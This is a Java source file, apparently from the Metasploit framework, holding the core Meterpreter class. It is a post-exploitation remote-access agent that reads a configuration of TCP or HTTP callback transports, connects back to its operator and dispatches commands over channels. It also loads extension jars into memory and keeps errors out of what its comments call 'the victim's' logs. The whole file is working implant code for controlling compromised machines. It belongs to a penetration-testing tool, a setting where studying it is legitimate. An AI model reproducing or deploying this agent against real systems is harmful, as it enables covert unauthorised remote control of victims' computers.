package com.metasploit.meterpreter;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;

import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.util.jar.JarInputStream;

import com.metasploit.meterpreter.command.Command;
import com.metasploit.meterpreter.core.core_loadlib;

/**
 * Main meterpreter class. Responsible for keeping all the stuff together and for managing channels.
 *
 * @author mihi
 */
public class Meterpreter {

    public static final int UUID_LEN = 16;
    public static final int URL_LEN = 512;

    private List/* <Channel> */channels = new ArrayList();
    private final CommandManager commandManager;
    private final Random rnd = new Random();
    private final ByteArrayOutputStream errBuffer;
    private final PrintStream err;
    private final boolean loadExtensions;
    private List/* <byte[]> */tlvQueue = null;


    private final TransportList transports = new TransportList();
    private byte[] uuid;
    private long sessionExpiry;


    private void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) throws MalformedURLException {
        System.out.println("msf : Parsing configuration");
        // socket handle is 4 bytes, followed by exit func, both of
        // which we ignore.
        int csr = 8;

        // We start with the expiry, which is a 32 bit int
        setExpiry(unpack32(configuration, csr));
        System.out.println("msf : Unpacked expiry: " + this.sessionExpiry);
        csr += 4;

        // this is followed with the UUID
        this.uuid = readBytes(configuration, csr, UUID_LEN);
        System.out.println("msf : Read the UUID: " + this.uuid.length);
        csr += UUID_LEN;

        // here we need to loop through all the given transports, we know that we're
        // going to get at least one.
        while (configuration[csr] != '\0') {
            // read the transport URL
            String url = readString(configuration, csr, URL_LEN);
            System.out.println("msf : Read URL: " + url);
            csr += URL_LEN;

            Transport t = null;
            if (url.startsWith("tcp")) {
                t = new TcpTransport(url);
            } else {
                t = new HttpTransport(url);
            }

            csr = t.parseConfig(configuration, csr);
            if (this.transports.isEmpty()) {
                System.out.println("msf : Binding the first transport");
                t.bind(in, rawOut);
            }
            this.transports.add(t);
        }
        
        // we don't currently support extensions, so when we reach the end of the
        // list of transports we just bomb out.
        System.out.println("msf : Finished parsing configuration");
    }

    public void setExpiry(long seconds) {
        System.out.println("msf : Setting expiry forward seconds " + seconds);
        this.sessionExpiry = System.currentTimeMillis() + seconds * 1000L;
    }

    public void sleep(long milliseconds) {
        try {
            Thread.sleep(milliseconds);
        } catch (InterruptedException ex) {
            // ignore
        }
    }

    public static String readString(byte[] bytes, int offset, int size) {
        return new String(readBytes(bytes, offset, size)).trim();
    }

    public static byte[] readBytes(byte[] bytes, int offset, int size) {
        byte[] buf = new byte[size];
        System.arraycopy(bytes, offset, buf, 0, size);
        return buf;
    }

    public static int unpack32(byte[] bytes, int offset) {
        int res = 0;
        for (int i = 0; i < 4; i++) {
          res = res | (((int)bytes[i + offset]) & 0xFF) << (i * 8);
        }
        return res;
    }

    /**
     * Initialize the meterpreter.
     *
     * @param in             Input stream to read from
     * @param rawOut         Output stream to write into
     * @param loadExtensions Whether to load (as a {@link ClassLoader} would do) the extension jars; disable this if you want to use your debugger's edit-and-continue feature or if you do not want to update the jars after each build
     * @param redirectErrors Whether to redirect errors to the internal error buffer; disable this to see the errors on the victim's standard error stream
     * @throws Exception
     */
    public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors) throws Exception {
        this(in, rawOut, loadExtensions, redirectErrors, true);
    }

    /**
     * Initialize the meterpreter.
     *
     * @param in             Input stream to read from
     * @param rawOut         Output stream to write into
     * @param loadExtensions Whether to load (as a {@link ClassLoader} would do) the extension jars; disable this if you want to use your debugger's edit-and-continue feature or if you do not want to update the jars after each build
     * @param redirectErrors Whether to redirect errors to the internal error buffer; disable this to see the errors on the victim's standard error stream
     * @param beginExecution Whether to begin executing immediately
     * @throws Exception
     */
    public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors, boolean beginExecution) throws Exception {
        System.out.println("msf : Meterpreter constructing");

        int configLen = in.readInt();
        byte[] configBytes = new byte[configLen];
        in.readFully(configBytes);

        System.out.println("msf : Meterpreter config length: " + configLen);

        loadConfiguration(in, rawOut, configBytes);

        this.loadExtensions = loadExtensions;
        this.commandManager = new CommandManager();
        this.channels.add(null); // main communication channel?
        if (redirectErrors) {
            errBuffer = new ByteArrayOutputStream();
            err = new PrintStream(errBuffer);
        } else {
            errBuffer = null;
            err = System.err;
        }
        if (beginExecution) {
            startExecuting();
        }
    }

    public boolean hasSessionExpired() {
        return System.currentTimeMillis() > this.sessionExpiry;
    }

    public void startExecuting() throws Exception {
        System.out.println("msf : kicking off execution");
        while (!this.hasSessionExpired() && this.transports.current() != null) {
            System.out.println("msf : initialising transport");
            if (!this.transports.current().connect(this)) {
                System.out.println("msf : connection failed, going to next transport");
                continue;
            }

            System.out.println("msf : entering dispatch");
            boolean cleanExit = this.transports.current().dispatch(this);
            System.out.println("msf : dispatch exited " + (cleanExit ? "cleanly" : "badly"));
            this.transports.current().disconnect();

            if (cleanExit && !this.transports.changeRequested()) {
                break;
            }

            this.transports.next(this);
        }
        synchronized (this) {
            for (Iterator it = channels.iterator(); it.hasNext(); ) {
                Channel c = (Channel) it.next();
                if (c != null)
                    c.close();
            }
        }
    }

    protected String getPayloadTrustManager() {
        return "com.metasploit.meterpreter.PayloadTrustManager";
    }

    /**
     * Get the command manager, used to register or lookup commands.
     */
    public CommandManager getCommandManager() {
        return commandManager;
    }

    /**
     * Register a new channel in this meterpreter. Used only by {@link Channel#Channel(Meterpreter, java.io.InputStream, OutputStream, java.io.InputStream)}.
     *
     * @param channel The channel to register
     * @return The channel's ID.
     */
    public synchronized int registerChannel(Channel channel) {
        channels.add(channel);
        return channels.size() - 1;
    }

    /**
     * Used by {@link Channel#close()} to notify the meterpreter that the channel has been closed.
     *
     * @param id The channel's ID
     */
    public synchronized void channelClosed(int id) {
        channels.set(id, null);
    }

    /**
     * Obtain a channel for a given channel ID
     *
     * @param id                 The channel ID to look up
     * @param throwIfNonexisting Whether to throw an exception if the channel does not exist
     * @return The channel, or <code>null</code> if the channel does not exist and it should not throw an exception
     */
    public Channel getChannel(int id, boolean throwIfNonexisting) {
        Channel result = null;
        if (id < channels.size()) {
            result = (Channel) channels.get(id);
        }
        if (result == null && throwIfNonexisting) {
            throw new IllegalArgumentException("Channel " + id + " does not exist.");
        }
        return result;
    }

    /**
     * Return the error stream where all errors should be written to. Do <b>not</b> write to {@link System#out} or {@link System#err} as this might appear in the victim's error logs.
     */
    public PrintStream getErrorStream() {
        return err;
    }

    /**
     * Return the length of the currently buffered error stream content, or <code>-1</code> if no buffering is active.
     */
    public int getErrorBufferLength() {
        if (errBuffer == null) {
            return -1;
        }
        return errBuffer.size();
    }

    /**
     * Return the currently buffered error stream content, or <code>null</code> if no buffering is active.
     */
    public byte[] getErrorBuffer() {
        if (errBuffer == null) {
            return null;
        }
        synchronized (errBuffer) {
            byte[] result = errBuffer.toByteArray();
            errBuffer.reset();
            return result;
        }
    }

    /**
     * Send a request packet over this meterpreter.
     *
     * @param packet Packet parameters
     * @param method Method to invoke
     */
    public void writeRequestPacket(String method, TLVPacket tlv) throws IOException {
        tlv.add(TLVType.TLV_TYPE_METHOD, method);
        char[] requestID = new char[32];
        for (int i = 0; i < requestID.length; i++) {
            requestID[i] = (char) ('A' + rnd.nextInt(26));
        }
        tlv.add(TLVType.TLV_TYPE_REQUEST_ID, new String(requestID));
        this.transports.current().writePacket(tlv, TLVPacket.PACKET_TYPE_REQUEST);
    }

    /**
     * Load an extension into this meterpreter. Called from {@link core_loadlib}.
     *
     * @param data The extension jar's content as a byte array
     */
    public String[] loadExtension(byte[] data) throws Exception {
        ClassLoader classLoader = getClass().getClassLoader();
        if (loadExtensions) {
            URL url = MemoryBufferURLConnection.createURL(data, "application/jar");
            classLoader = new URLClassLoader(new URL[]{url}, classLoader);
        }
        JarInputStream jis = new JarInputStream(new ByteArrayInputStream(data));
        String loaderName = (String) jis.getManifest().getMainAttributes().getValue("Extension-Loader");
        ExtensionLoader loader = (ExtensionLoader) classLoader.loadClass(loaderName).newInstance();
        commandManager.resetNewCommands();
        loader.load(commandManager);
        return commandManager.getNewCommands();
    }
}
